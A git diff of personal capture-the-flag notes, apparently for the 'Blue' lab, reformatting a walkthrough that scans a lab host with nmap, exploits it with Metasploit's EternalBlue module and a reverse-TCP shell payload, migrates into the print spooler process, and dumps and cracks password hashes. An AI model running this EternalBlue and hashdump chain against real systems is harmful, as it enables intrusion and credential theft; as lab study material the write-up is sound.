@@ -5,7 +5,7 @@ eternal blue  msf  ///  print spooler to escalate and hashdump (john)
 
 
 
-
+```bash
 nmap -sC -sS -sV -T4 -O -n -Pn 10.10.201.173 -oN nmap1
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 12:42 EST
@@ -67,14 +67,11 @@ Host script results:
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 97.32 seconds
+```
 
 vuln scan 
-
-nmap -sC -sV -sC vuln 10.10.201.173 -oN nmapVuln
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 13:23 EST
-Failed to resolve "vuln".
-
-                                                                                                                                                                      
+```bash
+  
 ┌──(root💀kali)-[/hackme/blue]
 └─# nmap -sC -sV --script vuln 10.10.201.173 -oN nmapVuln                                                                                                       130 ⨯
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 13:24 EST
@@ -139,15 +136,15 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 121.48 seconds
+```
 
-
-msf time 
+### msf time 
 
 exploit/windows/smb/ms17_010_eternalblue
 
 set payload windows/x64/shell/reverse_tcp
 
-we are in,,, background shell (conrol Z), 
+we are in,,, background shell (control Z), 
 
 now we are converting a shell into a meterpreter shell
 
@@ -168,7 +165,7 @@ ps  // then look for "Find a process towards the bottom of this list that is run
 
 printer spooler is the way to go,,, 
 
-
+```bash
 meterpreter > migrate 1264
 [*] Migrating from 2892 to 1264...                                                                                                                                    
 [*] Migration completed successfully.                                                                                                                                 
@@ -191,11 +188,11 @@ Guest::501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Jon:alqfna22:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 
 3 password hashes cracked, 0 left
-
+```
 
 first flag is in C:\
 
-second is in Windows\System32\config   same locations as SAM FILE
+second is in `Windows\System32\config`   same locations as SAM FILE
 
 third is in jon's desktop
 
